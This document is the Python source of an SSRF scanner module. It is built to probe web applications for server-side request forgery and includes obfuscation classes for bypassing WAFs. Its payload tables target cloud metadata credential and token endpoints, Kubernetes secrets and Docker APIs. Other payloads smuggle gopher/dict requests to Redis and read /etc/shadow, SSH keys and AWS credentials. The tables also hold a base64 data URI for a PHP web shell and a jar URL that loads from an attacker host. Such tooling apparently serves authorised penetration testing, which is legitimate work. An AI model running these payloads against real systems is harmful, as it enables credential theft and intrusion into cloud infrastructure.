"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    SSRF SCANNER v3.0 - GOD-MODE EDITION                      ║
║                      Server-Side Request Forgery Engine                       ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  Features:                                                                    ║
║  • Multi-Protocol Exploitation (15+ protocols)                               ║
║  • Cloud Metadata Harvesting (AWS/GCP/Azure/DO/Alibaba/Oracle)               ║
║  • Blind SSRF Detection (DNS/HTTP/FTP OOB)                                   ║
║  • IP Obfuscation Bypass (20+ encoding techniques)                           ║
║  • WAF Detection + Bypass (12+ WAFs)                                         ║
║  • DNS Rebinding Attack Support                                               ║
║  • Internal Network Enumeration                                               ║
║  • Protocol Smuggling (gopher, dict, ldap, etc.)                             ║
║  • Cross-Validation + Confidence Scoring (0-100)                             ║
║  • Header Injection Testing                                                   ║
║  • PDF/SVG/XML SSRF Vectors                                                  ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

from __future__ import annotations

import asyncio
import hashlib
import ipaddress
import random
import string
import time
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import TYPE_CHECKING, Any, Optional
from urllib.parse import parse_qs, quote, urlencode, urljoin, urlparse

import httpx

from scanning.findings import Finding, VulnType, VulnCategory, Severity
from scanning.vuln_scanner import ScanModule
from scanning.scan_context import ScanContext
from utils.logger import get_logger
from utils.network_utils import resolve_base_url
from utils.rate_limiter import RateLimiter
from utils.http_client import (
    create_protected_client,
    is_bug_bounty_mode,
    get_configured_ssl_verify,
)
from utils.scanner_helpers import WAFType as BaseWAFType, WAFDetector as BaseWAFDetector

# Import OOB Engine for blind SSRF detection
try:
    from utils.oob_engine import OOBEngine, CallbackType
    OOB_ENGINE_AVAILABLE = True
except ImportError:
    OOB_ENGINE_AVAILABLE = False

# Import SSRF safety filter for bug bounty mode
try:
    from utils.ssrf_safety import SSRFSafetyFilter, create_bug_bounty_filter
    SSRF_SAFETY_AVAILABLE = True
except ImportError:
    SSRF_SAFETY_AVAILABLE = False

if TYPE_CHECKING:
    from core.config_manager import Settings

logger = get_logger(__name__)

# Version
SSRF_SCANNER_VERSION = "3.0.0-GOD-MODE"


class SSRFType(Enum):
    """Types of SSRF attacks."""
    BASIC = auto()           # Basic URL fetch
    BLIND = auto()           # No response reflection
    PARTIAL_BLIND = auto()   # Error messages only
    TIME_BASED = auto()      # Response time analysis
    DNS_OOB = auto()         # DNS out-of-band
    HTTP_OOB = auto()        # HTTP callback
    PROTOCOL_SMUGGLE = auto() # Protocol smuggling
    DNS_REBINDING = auto()   # DNS rebinding attack
    PDF_SSRF = auto()        # PDF generation SSRF
    SVG_SSRF = auto()        # SVG image SSRF
    XML_SSRF = auto()        # XML/XXE based SSRF
    REDIRECT = auto()        # Open redirect chaining


class Protocol(Enum):
    """Supported protocols for SSRF."""
    HTTP = "http"
    HTTPS = "https"
    FILE = "file"
    FTP = "ftp"
    GOPHER = "gopher"
    DICT = "dict"
    LDAP = "ldap"
    TFTP = "tftp"
    SFTP = "sftp"
    NETDOC = "netdoc"
    JAR = "jar"
    DATA = "data"
    PHP_STREAM = "php"
    EXPECT = "expect"
    PHAR = "phar"


class CloudProvider(Enum):
    """Cloud service providers with metadata endpoints."""
    AWS = "aws"
    GCP = "gcp"
    AZURE = "azure"
    DIGITALOCEAN = "digitalocean"
    ALIBABA = "alibaba"
    ORACLE = "oracle"
    OPENSTACK = "openstack"
    KUBERNETES = "kubernetes"
    DOCKER = "docker"
    RANCHER = "rancher"


# WAFType - Use centralized version from scanner_helpers
class WAFType(Enum):
    """WAF types for detection and bypass - wraps centralized version."""
    CLOUDFLARE = "cloudflare"
    AKAMAI = "akamai"
    AWS_WAF = "aws_waf"
    IMPERVA = "imperva"
    F5_BIG_IP = "f5_bigip"
    MODSECURITY = "modsecurity"
    SUCURI = "sucuri"
    FORTINET = "fortinet"
    BARRACUDA = "barracuda"
    AZURE_WAF = "azure_waf"
    WORDFENCE = "wordfence"
    COMODO = "comodo"
    UNKNOWN = "unknown"
    NONE = "none"

    @classmethod
    def from_base(cls, base_waf: BaseWAFType) -> "WAFType":
        """Convert from centralized WAFType."""
        mapping = {
            BaseWAFType.CLOUDFLARE: cls.CLOUDFLARE,
            BaseWAFType.AKAMAI: cls.AKAMAI,
            BaseWAFType.AWS_WAF: cls.AWS_WAF,
            BaseWAFType.IMPERVA: cls.IMPERVA,
            BaseWAFType.F5_BIG_IP: cls.F5_BIG_IP,
            BaseWAFType.MODSECURITY: cls.MODSECURITY,
            BaseWAFType.SUCURI: cls.SUCURI,
            BaseWAFType.FORTINET: cls.FORTINET,
            BaseWAFType.BARRACUDA: cls.BARRACUDA,
            BaseWAFType.AZURE_WAF: cls.AZURE_WAF,
            BaseWAFType.WORDFENCE: cls.WORDFENCE,
            BaseWAFType.UNKNOWN: cls.UNKNOWN,
            BaseWAFType.NONE: cls.NONE,
        }
        return mapping.get(base_waf, cls.UNKNOWN)


@dataclass
class SSRFResult:
    """Result of an SSRF test."""
    vulnerable: bool
    ssrf_type: SSRFType
    confidence: int  # 0-100
    payload: str
    evidence: list[str] = field(default_factory=list)
    response_data: Optional[str] = None
    cloud_provider: Optional[CloudProvider] = None
    protocol: Optional[Protocol] = None
    metadata_leaked: bool = False
    internal_ip_accessed: bool = False
    service_discovered: Optional[str] = None


class WAFDetector:
    """
    WAF detection for SSRF - uses centralized BaseWAFDetector.

    Provides backward-compatible API while leveraging comprehensive
    signatures from utils/scanner_helpers.py.
    """

    @classmethod
    def detect(cls, response: httpx.Response) -> Optional[WAFType]:
        """Detect WAF from response using centralized detector."""
        base_waf_type, _ = BaseWAFDetector.detect(response)
        if base_waf_type == BaseWAFType.NONE:
            return None
        return WAFType.from_base(base_waf_type)

    @classmethod
    def is_blocked(cls, response: httpx.Response) -> bool:
        """Check if request was blocked by WAF."""
        _, is_blocked = BaseWAFDetector.detect(response)
        return is_blocked


class IPObfuscator:
    """IP address obfuscation techniques for WAF bypass."""
    
    @staticmethod
    def to_decimal(ip: str) -> str:
        """Convert IP to decimal format."""
        try:
            octets = ip.split(".")
            if len(octets) != 4:
                return ip
            return str(int(ipaddress.ip_address(ip)))
        except (ValueError, AttributeError):
            return ip

    @staticmethod
    def to_hex(ip: str) -> str:
        """Convert IP to hexadecimal format."""
        try:
            return hex(int(ipaddress.ip_address(ip)))
        except (ValueError, AttributeError):
            return ip

    @staticmethod
    def to_octal(ip: str) -> str:
        """Convert IP to octal format."""
        try:
            octets = ip.split(".")
            if len(octets) != 4:
                return ip
            return ".".join(oct(int(o)) for o in octets)
        except (ValueError, AttributeError):
            return ip

    @staticmethod
    def to_hex_octets(ip: str) -> str:
        """Convert each octet to hex."""
        try:
            octets = ip.split(".")
            if len(octets) != 4:
                return ip
            return ".".join(hex(int(o)) for o in octets)
        except (ValueError, AttributeError):
            return ip

    @staticmethod
    def to_mixed_notation(ip: str) -> str:
        """Use mixed decimal/octal notation."""
        try:
            octets = ip.split(".")
            if len(octets) != 4:
                return ip
            result = []
            for i, o in enumerate(octets):
                if i % 2 == 0:
                    result.append(oct(int(o)))
                else:
                    result.append(o)
            return ".".join(result)
        except (ValueError, AttributeError):
            return ip

    @staticmethod
    def to_ipv6_mapped(ip: str) -> str:
        """Convert to IPv6-mapped IPv4 address."""
        return f"[::ffff:{ip}]"

    @staticmethod
    def to_shortened(ip: str) -> str:
        """Use shortened notation (127.0.0.1 -> 127.1)."""
        if ip == "127.0.0.1":
            return random.choice(["127.1", "127.0.1", "127.0.0.1"])
        return ip

    @staticmethod
    def to_overflow(ip: str) -> str:
        """Use integer overflow technique."""
        try:
            octets = ip.split(".")
            if len(octets) != 4:
                return ip
            # Add 256 to first octet (overflow)
            overflow_octet = str(int(octets[0]) + 256)
            return f"{overflow_octet}.{'.'.join(octets[1:])}"
        except (ValueError, AttributeError):
            return ip
    
    @staticmethod
    def with_auth_bypass(ip: str) -> str:
        """Add username:password to bypass URL parsing."""
        return f"attacker@{ip}"
    
    @staticmethod
    def with_port_variance(ip: str, port: int = 80) -> str:
        """Add unusual port notation."""
        return f"{ip}:{port}"
    
    @staticmethod
    def with_unicode_dot(ip: str) -> str:
        """Replace dots with unicode dots."""
        return ip.replace(".", "。")  # Full-width dot
    
    @staticmethod
    def double_url_encode(ip: str) -> str:
        """Double URL encode."""
        single = quote(ip, safe="")
        return quote(single, safe="")
    
    @staticmethod
    def to_url_encoded(ip: str) -> str:
        """URL encode dots and numbers."""
        result = ""
        for char in ip:
            if char.isdigit() or char == ".":
                result += f"%{ord(char):02x}"
            else:
                result += char
        return result
    
    @classmethod
    def get_all_variants(cls, ip: str) -> list[str]:
        """Get all obfuscation variants of an IP."""
        variants = [
            ip,
            cls.to_decimal(ip),
            cls.to_hex(ip),
            cls.to_octal(ip),
            cls.to_hex_octets(ip),
            cls.to_mixed_notation(ip),
            cls.to_ipv6_mapped(ip),
            cls.to_shortened(ip),
            cls.to_overflow(ip),
            cls.with_auth_bypass(ip),
            cls.to_url_encoded(ip),
            cls.double_url_encode(ip),
            cls.with_unicode_dot(ip),
            # Additional bypass techniques
            f"0x{int(ipaddress.ip_address(ip)) if ip.count('.') == 3 else 0:08x}",
            f"0{int(ipaddress.ip_address(ip)) if ip.count('.') == 3 else 0:011o}",
        ]
        return list(set(v for v in variants if v))


class PayloadGenerator:
    """Generate SSRF payloads for various targets and protocols."""
    
    # Internal IP targets
    INTERNAL_IPS = [
        "127.0.0.1",
        "localhost",
        "127.1",
        "127.0.1",
        "0.0.0.0",
        "0",
        "[::1]",
        "[::]",
        "[0000::1]",
        "0x7f000001",
        "2130706433",
        "017700000001",
        "0177.0.0.1",
        "127.0.0.1.nip.io",
        "127.0.0.1.xip.io",
        "localtest.me",
        "spoofed.burpcollaborator.net",
    ]
    
    # Common internal network ranges
    INTERNAL_RANGES = [
        ("10.0.0.1", "AWS VPC Default"),
        ("10.0.0.2", "Common Gateway"),
        ("10.10.10.10", "Internal Test"),
        ("172.16.0.1", "Docker Default"),
        ("172.17.0.1", "Docker Bridge"),
        ("172.18.0.1", "Docker Network"),
        ("192.168.0.1", "Router Default"),
        ("192.168.1.1", "Home Router"),
        ("192.168.1.254", "Gateway"),
    ]
    
    # Cloud metadata endpoints - comprehensive
    CLOUD_METADATA = {
        CloudProvider.AWS: {
            "endpoints": [
                # IMDSv1 (legacy - no token required)
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/hostname",
                "http://169.254.169.254/latest/meta-data/local-ipv4",
                "http://169.254.169.254/latest/meta-data/public-ipv4",
                "http://169.254.169.254/latest/meta-data/ami-id",
                "http://169.254.169.254/latest/meta-data/instance-id",
                "http://169.254.169.254/latest/meta-data/instance-type",
                "http://169.254.169.254/latest/meta-data/iam/info",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://169.254.169.254/latest/user-data",
                "http://169.254.169.254/latest/dynamic/instance-identity/document",
                # Alternative IPs
                "http://[fd00:ec2::254]/latest/meta-data/",
                "http://instance-data/latest/meta-data/",
            ],
            # IMDSv2 endpoints (require X-aws-ec2-metadata-token header)
            "imdsv2_endpoints": [
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://169.254.169.254/latest/user-data",
                "http://169.254.169.254/latest/dynamic/instance-identity/document",
            ],
            # IMDSv2 token endpoint (PUT request with TTL header)
            "imdsv2_token_endpoint": "http://169.254.169.254/latest/api/token",
            "imdsv2_token_headers": {
                "X-aws-ec2-metadata-token-ttl-seconds": "21600",
            },
            "critical_paths": [
                "/latest/meta-data/iam/security-credentials/",
                "/latest/user-data",
            ],
            "indicators": ["ami-id", "instance-id", "AccessKeyId", "SecretAccessKey"],
        },
        CloudProvider.GCP: {
            "endpoints": [
                "http://169.254.169.254/computeMetadata/v1/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://metadata.google.internal/computeMetadata/v1/instance/",
                "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
                "http://metadata.google.internal/computeMetadata/v1/instance/id",
                "http://metadata.google.internal/computeMetadata/v1/project/",
                "http://metadata.google.internal/computeMetadata/v1/project/project-id",
                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                "http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
                "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env",
            ],
            "headers": {"Metadata-Flavor": "Google"},
            "indicators": ["computeMetadata", "access_token", "project-id"],
        },
        CloudProvider.AZURE: {
            "endpoints": [
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01",
                "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01",
                "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/",
                "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://storage.azure.com/",
                "http://169.254.169.254/metadata/attested/document?api-version=2021-02-01",
            ],
            "headers": {"Metadata": "true"},
            "indicators": ["subscriptionId", "resourceGroupName", "access_token"],
        },
        CloudProvider.DIGITALOCEAN: {
            "endpoints": [
                "http://169.254.169.254/metadata/v1/",
                "http://169.254.169.254/metadata/v1/id",
                "http://169.254.169.254/metadata/v1/hostname",
                "http://169.254.169.254/metadata/v1/region",
                "http://169.254.169.254/metadata/v1/interfaces/private/0/ipv4/address",
                "http://169.254.169.254/metadata/v1/floating_ip/ipv4/active",
                "http://169.254.169.254/metadata/v1/dns/nameservers",
            ],
            "indicators": ["droplet_id", "hostname", "region"],
        },
        CloudProvider.ALIBABA: {
            "endpoints": [
                "http://100.100.100.200/latest/meta-data/",
                "http://100.100.100.200/latest/meta-data/instance-id",
                "http://100.100.100.200/latest/meta-data/hostname",
                "http://100.100.100.200/latest/meta-data/eipv4",
                "http://100.100.100.200/latest/meta-data/vpc-id",
                "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
                "http://100.100.100.200/latest/user-data",
            ],
            "indicators": ["alicloud", "ecs.instance-id", "ram/security"],
        },
        CloudProvider.ORACLE: {
            "endpoints": [
                "http://169.254.169.254/opc/v1/instance/",
                "http://169.254.169.254/opc/v1/instance/id",
                "http://169.254.169.254/opc/v1/instance/metadata/",
                "http://169.254.169.254/opc/v2/instance/",
                "http://169.254.169.254/opc/v1/identity/",
            ],
            "headers": {"Authorization": "Bearer Oracle"},
            "indicators": ["ocid1.", "compartmentId", "opc"],
        },
        CloudProvider.OPENSTACK: {
            "endpoints": [
                "http://169.254.169.254/openstack/latest/meta_data.json",
                "http://169.254.169.254/openstack/latest/user_data",
                "http://169.254.169.254/openstack/2012-08-10/meta_data.json",
            ],
            "indicators": ["availability_zone", "uuid", "meta"],
        },
        CloudProvider.KUBERNETES: {
            "endpoints": [
                "https://kubernetes.default.svc/",
                "https://kubernetes.default.svc/api",
                "https://kubernetes.default.svc/api/v1",
                "https://kubernetes.default.svc/api/v1/namespaces",
                "https://kubernetes.default.svc/api/v1/secrets",
                "http://127.0.0.1:10255/pods",  # Kubelet API
                "http://127.0.0.1:10255/spec",
                "http://127.0.0.1:8001/api/v1/namespaces/default/secrets",
                "http://[::1]:10255/pods",
            ],
            "indicators": ["serviceAccountToken", "namespace", "pods", "apiVersion"],
        },
        CloudProvider.DOCKER: {
            "endpoints": [
                # Docker API (default)
                "http://127.0.0.1:2375/v1.24/containers/json",
                "http://127.0.0.1:2375/containers/json",
                "http://127.0.0.1:2375/images/json",
                "http://127.0.0.1:2375/version",
                "http://127.0.0.1:2375/info",
                "http://[::1]:2375/version",
                # Docker socket (unix)
                "unix:///var/run/docker.sock",
                # containerd (CRI) - critical for Kubernetes
                "http://127.0.0.1:10010/v1/containers",  # containerd CRI
                "unix:///run/containerd/containerd.sock",
                "unix:///var/run/containerd/containerd.sock",
                # CRI-O (OpenShift/Kubernetes)
                "http://127.0.0.1:10010/info",
                "unix:///var/run/crio/crio.sock",
                "unix:///run/crio/crio.sock",
                # Podman (rootless containers)
                "http://127.0.0.1:8080/v1.0.0/libpod/containers/json",
                "http://127.0.0.1:8080/v1.0.0/libpod/info",
                "unix:///run/podman/podman.sock",
                "unix:///run/user/1000/podman/podman.sock",
                # Docker alternative ports
                "http://127.0.0.1:2376/version",  # TLS
                "http://127.0.0.1:4243/version",  # Alternative
                # Minikube Docker
                "http://127.0.0.1:2376/v1.24/containers/json",
            ],
            "indicators": ["docker", "Container", "Image", "ApiVersion", "containerd", "cri-o", "podman"],
        },
        CloudProvider.RANCHER: {
            "endpoints": [
                "http://rancher-metadata/2015-12-19/",
                "http://rancher-metadata/latest/",
            ],
            "indicators": ["rancher", "self/host"],
        },
    }
    
    # Protocol smuggling payloads
    PROTOCOL_SMUGGLING = {
        Protocol.GOPHER: {
            "redis": "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a",
            "redis_config": "gopher://127.0.0.1:6379/_CONFIG%20GET%20*%0d%0a",
            "memcached": "gopher://127.0.0.1:11211/_stats%0d%0a",
            "smtp": "gopher://127.0.0.1:25/_HELO%20test%0d%0a",
            "mysql_init": "gopher://127.0.0.1:3306/_",
            "ftp": "gopher://127.0.0.1:21/_USER%20anonymous%0d%0a",
        },
        Protocol.DICT: {
            "redis": "dict://127.0.0.1:6379/INFO",
            "memcached": "dict://127.0.0.1:11211/stats",
            "http": "dict://127.0.0.1:80/",
        },
        Protocol.LDAP: {
            "basic": "ldap://127.0.0.1/dc=example,dc=com",
            "search": "ldap://127.0.0.1/cn=admin,dc=example,dc=com??sub?(objectClass=*)",
        },
        Protocol.FILE: {
            "passwd": "file:///etc/passwd",
            "shadow": "file:///etc/shadow",
            "hosts": "file:///etc/hosts",
            "resolv": "file:///etc/resolv.conf",
            "aws_creds": "file:///home/user/.aws/credentials",
            "bash_history": "file:///home/user/.bash_history",
            "ssh_key": "file:///home/user/.ssh/id_rsa",
            "proc_self": "file:///proc/self/environ",
            "proc_cmdline": "file:///proc/self/cmdline",
            "win_hosts": "file:///c:/windows/system32/drivers/etc/hosts",
            "win_ini": "file:///c:/windows/win.ini",
            "win_boot": "file:///c:/boot.ini",
        },
        Protocol.FTP: {
            "anonymous": "ftp://anonymous:anonymous@127.0.0.1/",
            "root": "ftp://127.0.0.1/",
        },
        Protocol.TFTP: {
            "etc_passwd": "tftp://127.0.0.1/etc/passwd",
        },
        Protocol.PHP_STREAM: {
            "filter_base64": "php://filter/convert.base64-encode/resource=/etc/passwd",
            "filter_read": "php://filter/read=string.rot13/resource=/etc/passwd",
            "input": "php://input",
            "data": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+",
        },
        Protocol.EXPECT: {
            "id": "expect://id",
            "whoami": "expect://whoami",
        },
        Protocol.PHAR: {
            "basic": "phar:///tmp/malicious.phar",
        },
        Protocol.NETDOC: {
            "basic": "netdoc:///etc/passwd",
        },
        Protocol.JAR: {
            "basic": "jar:http://attacker.com/malicious.jar!/",
        },
    }
    
    # Common SSRF-vulnerable parameters
    SSRF_PARAMS = [
        # URL parameters
        "url", "uri", "path", "dest", "destination", "redirect", "target",
        "rurl", "return", "return_url", "returnUrl", "return_to", "returnTo",
        # Resource parameters
        "page", "view", "site", "domain", "callback", "cb", "proxy",
        "image", "img", "imageurl", "image_url", "imgurl", "pic", "picture",
        "doc", "document", "file", "filename", "filepath", "file_path",
        "link", "href", "src", "source", "data", "reference", "ref",
        # Feed parameters
        "feed", "rss", "atom", "xml", "json", "api",
        # Fetch parameters
        "fetch", "load", "get", "request", "req", "remote", "external",
        # Navigation parameters
        "next", "continue", "go", "goto", "out", "checkout", "check",
        "window", "navigate", "to", "target_url", "targetUrl",
        # Preview parameters
        "preview", "render", "html", "template", "content",
        # Webhook parameters
        "webhook", "hook", "endpoint", "host", "server", "addr", "address",
        # OAuth/Auth parameters
        "redirect_uri", "redirectUri", "oauth", "oidc", "openid",
        # Export/Import
        "export", "import", "upload", "download", "from", "fromUrl",
        # PDF/Screenshot
        "pdf", "screenshot", "capture", "snap", "print",
        # Misc
        "avatar", "icon", "logo", "banner", "thumb", "thumbnail",
    ]
    
    # Common internal services to probe
    INTERNAL_SERVICES = [
        ("http://127.0.0.1:22", "SSH"),
        ("http://127.0.0.1:80", "HTTP"),
        ("http://127.0.0.1:443", "HTTPS"),
        ("http://127.0.0.1:8080", "HTTP Proxy/Alt"),
        ("http://127.0.0.1:8443", "HTTPS Alt"),
        ("http://127.0.0.1:3000", "Node.js/Dev"),
        ("http://127.0.0.1:3306", "MySQL"),
        ("http://127.0.0.1:5432", "PostgreSQL"),
        ("http://127.0.0.1:6379", "Redis"),
        ("http://127.0.0.1:27017", "MongoDB"),
        ("http://127.0.0.1:9200", "Elasticsearch"),
        ("http://127.0.0.1:9300", "Elasticsearch Cluster"),
        ("http://127.0.0.1:11211", "Memcached"),
        ("http://127.0.0.1:5672", "RabbitMQ"),
        ("http://127.0.0.1:15672", "RabbitMQ Management"),
        ("http://127.0.0.1:8500", "Consul"),
        ("http://127.0.0.1:2181", "ZooKeeper"),
        ("http://127.0.0.1:9092", "Kafka"),
        ("http://127.0.0.1:2375", "Docker API"),
        ("http://127.0.0.1:2376", "Docker TLS"),
        ("http://127.0.0.1:10250", "Kubelet"),
        ("http://127.0.0.1:10255", "Kubelet Read-only"),
        ("http://127.0.0.1:8001", "Kubectl Proxy"),
        ("http://127.0.0.1:4040", "Spark"),
        ("http://127.0.0.1:7077", "Spark Master"),
        ("http://127.0.0.1:50070", "HDFS NameNode"),
        ("http://127.0.0.1:50075", "HDFS DataNode"),
        ("http://127.0.0.1:8088", "YARN"),
        ("http://127.0.0.1:9042", "Cassandra"),
        ("http://127.0.0.1:7199", "Cassandra JMX"),
        ("http://127.0.0.1:1433", "MSSQL"),
        ("http://127.0.0.1:1521", "Oracle DB"),
        ("http://127.0.0.1:389", "LDAP"),
        ("http://127.0.0.1:636", "LDAPS"),
        ("http://127.0.0.1:25", "SMTP"),
        ("http://127.0.0.1:587", "SMTP Submission"),
        ("http://127.0.0.1:110", "POP3"),
        ("http://127.0.0.1:143", "IMAP"),
        ("http://127.0.0.1:21", "FTP"),
        ("http://127.0.0.1:53", "DNS"),
        ("http://127.0.0.1:161", "SNMP"),
        ("http://127.0.0.1:8983", "Solr"),
        ("http://127.0.0.1:8086", "InfluxDB"),
        ("http://127.0.0.1:3000", "Grafana"),
        ("http://127.0.0.1:9090", "Prometheus"),
        ("http://127.0.0.1:5601", "Kibana"),
        ("http://127.0.0.1:8161", "ActiveMQ"),
        ("http://127.0.0.1:61616", "ActiveMQ OpenWire"),
        ("http://127.0.0.1:4444", "Selenium"),
        ("http://127.0.0.1:5555", "Android ADB"),
        ("http://127.0.0.1:9000", "PHP-FPM"),
        ("http://127.0.0.1:6080", "NoVNC"),
        ("http://127.0.0.1:5900", "VNC"),
    ]
    
    @classmethod
    def generate_localhost_payloads(cls) -> list[tuple[str, str]]:
        """Generate all localhost variations."""
        payloads = []
        for ip in cls.INTERNAL_IPS:
            payloads.append((f"http://{ip}/", f"Localhost variant: {ip}"))
            payloads.append((f"http://{ip}:80/", f"Localhost variant with port: {ip}"))
            payloads.append((f"https://{ip}/", f"HTTPS localhost: {ip}"))
            
            # IP obfuscation variants
            if ip == "127.0.0.1":
                for variant in IPObfuscator.get_all_variants(ip)[:10]:
                    payloads.append((f"http://{variant}/", f"Obfuscated: {variant}"))
        
        return payloads
    
    @classmethod
    def generate_cloud_payloads(cls, provider: CloudProvider) -> list[tuple[str, str]]:
        """Generate cloud metadata payloads for a provider."""
        payloads = []
        config = cls.CLOUD_METADATA.get(provider, {})
        
        for endpoint in config.get("endpoints", []):
            payloads.append((endpoint, f"{provider.value.upper()} metadata"))
        
        return payloads
    
    @classmethod
    def generate_protocol_payloads(cls) -> list[tuple[str, str, Protocol]]:
        """Generate protocol smuggling payloads."""
        payloads = []
        
        for protocol, targets in cls.PROTOCOL_SMUGGLING.items():
            for target_name, payload in targets.items():
                payloads.append((payload, f"{protocol.value}:// - {target_name}", protocol))
        
        return payloads


class ResponseAnalyzer:
    """Analyze responses for SSRF indicators."""
    
    # Patterns indicating successful SSRF
    # IMPORTANT: These must be SPECIFIC enough to not trigger on normal web pages
    SSRF_INDICATORS = {
        "localhost_access": [
            "connection refused",
            "connection reset by peer",
            "connection timed out",
            "couldn't connect to host",
            "no route to host",
            "network is unreachable",
            "host not found",
            "name resolution failed",
            "getaddrinfo failed",
        ],
        "internal_network": [
            "private ip address",
            "internal server error occurred",
            "backend server is at capacity",
            "upstream connect error",
        ],
        # Cloud metadata - VERY SPECIFIC patterns that indicate actual metadata access
        "cloud_metadata": {
            "aws": [
                "ami-", "i-0", "ip-10-", "ip-172-", "ip-192-168-",
                "arn:aws:", "AKIA", "ASIA",  # AWS ARN and access key prefixes
                "latest/meta-data", "latest/dynamic", "latest/user-data",
                '"Code" : "Success"', '"AccountId"', '"InstanceProfileArn"'
            ],
            "gcp": [
                "computeMetadata/v1", "Metadata-Flavor: Google",
                "project/project-id", "instance/service-accounts",
                '"access_token":"ya29.'
            ],
            "azure": [
                "metadata/instance?api-version=",
                '"subscriptionId":', '"resourceGroupName":', '"vmId":',
                "IMDS", "Instance Metadata Service"
            ],
            "digitalocean": [
                '"droplet_id":', '"floating_ip":', "metadata.digitalocean.com"
            ],
            "kubernetes": [
                "serviceaccount/token", "downward-api",
                '"apiVersion": "v1"', '"kind": "Pod"', '"kind": "Secret"'
            ],
        },
        # File content - VERY SPECIFIC patterns
        "file_content": [
            "root:x:0:0:",  # Specific /etc/passwd format
            "daemon:x:1:1:", "bin:x:2:2:", "nobody:x:",  # More specific
            "root:$1$", "root:$5$", "root:$6$",  # Hashed passwords
            "127.0.0.1\tlocalhost", "::1\tlocalhost",  # /etc/hosts format
            "nameserver 8.8.8.8", "nameserver 127.0.",  # resolv.conf
            "aws_access_key_id", "aws_secret_access_key",  # AWS creds
            "-----BEGIN RSA PRIVATE KEY-----",
            "-----BEGIN OPENSSH PRIVATE KEY-----",
            "-----BEGIN EC PRIVATE KEY-----",
        ],
        # Service banners - VERY SPECIFIC patterns
        "service_banners": {
            "redis": ["redis_version:", "+PONG", "-ERR", "connected_clients:"],
            "memcached": ["STAT pid ", "STAT uptime ", "STAT version "],
            "mysql": ["mysql_native_password", "caching_sha2_password", "5.7.", "8.0."],
            "elasticsearch": ['"cluster_name":', '"cluster_uuid":', '"tagline" : "You Know, for Search"'],
            "mongodb": ['"ismaster" : true', '"maxBsonObjectSize" :'],
            "ssh": ["SSH-2.0-", "SSH-1.99-", "OpenSSH_"],
            "ftp": ["220 ", "220-", "ProFTPD", "vsftpd", "FileZilla Server"],
            "smtp": ["220 ", "250 ", "ESMTP Postfix", "ESMTP Sendmail"],
        },
        "error_disclosure": [
            "socket error:",
            "curl error:",
            "failed to open stream:",
            "file_get_contents(",
            "fopen(",
            "php_network_getaddresses",
            "getaddrinfo ENOTFOUND",
        ],
    }
    
    # Time-based detection thresholds
    TIMEOUT_THRESHOLD_OPEN = 3.0  # Port likely open
    TIMEOUT_THRESHOLD_FILTERED = 8.0  # Port likely filtered
    
    @classmethod
    def analyze(
        cls,
        response: httpx.Response,
        payload: str,
        baseline_response: Optional[httpx.Response] = None,
        expected_target: Optional[str] = None,
    ) -> SSRFResult:
        """Analyze response for SSRF indicators."""
        content = response.text.lower()
        headers = {k.lower(): v.lower() for k, v in response.headers.items()}
        status_code = response.status_code
        response_time = response.elapsed.total_seconds()
        
        evidence = []
        confidence = 0
        ssrf_type = SSRFType.BASIC
        cloud_provider = None
        metadata_leaked = False
        internal_ip_accessed = False
        service_discovered = None
        
        # Check for cloud metadata indicators
        for provider, indicators in cls.SSRF_INDICATORS["cloud_metadata"].items():
            for indicator in indicators:
                if indicator.lower() in content:
                    evidence.append(f"Cloud metadata indicator ({provider}): {indicator}")
                    confidence += 25
                    cloud_provider = CloudProvider[provider.upper()] if provider.upper() in CloudProvider.__members__ else None
                    metadata_leaked = True
        
        # Check for file content disclosure
        for indicator in cls.SSRF_INDICATORS["file_content"]:
            if indicator.lower() in content:
                evidence.append(f"File content indicator: {indicator}")
                confidence += 20
                ssrf_type = SSRFType.PROTOCOL_SMUGGLE
        
        # Check for service banners
        for service, indicators in cls.SSRF_INDICATORS["service_banners"].items():
            for indicator in indicators:
                if indicator.lower() in content:
                    evidence.append(f"Service banner detected ({service}): {indicator}")
                    confidence += 15
                    service_discovered = service
        
        # Check for localhost access indicators
        for indicator in cls.SSRF_INDICATORS["localhost_access"]:
            if indicator in content:
                evidence.append(f"Localhost access indicator: {indicator}")
                confidence += 10
                internal_ip_accessed = True
        
        # Check for error disclosure
        for indicator in cls.SSRF_INDICATORS["error_disclosure"]:
            if indicator in content:
                evidence.append(f"Error disclosure: {indicator}")
                confidence += 5
        
        # SPA Detection - SPAs return the same shell for any URL parameter
        # These are FALSE POSITIVES because the URL wasn't actually fetched
        spa_indicators = [
            'ng-app', 'ng-controller', 'data-ng-',  # Angular
            '__next', '_next/static', 'data-reactroot', 'data-react',  # React/Next
            'data-v-', 'v-cloak', '__vue__',  # Vue
            'data-svelte', '__svelte__',  # Svelte
            'ember-view', 'data-ember',  # Ember
            'data-qwik', 'q:base',  # Qwik
            'astro-island',  # Astro
        ]
        is_spa = any(indicator.lower() in content for indicator in spa_indicators)

        # If SPA detected and no STRONG evidence, reduce confidence significantly
        if is_spa:
            # Check if we have ACTUAL SSRF evidence (cloud metadata, service banners, file content)
            has_strong_evidence = metadata_leaked or service_discovered or any(
                'file content' in e.lower() or 'cloud metadata' in e.lower() or 'service banner' in e.lower()
                for e in evidence
            )
            if not has_strong_evidence:
                # Likely false positive - SPA returning same response for any URL
                confidence = max(0, confidence - 30)
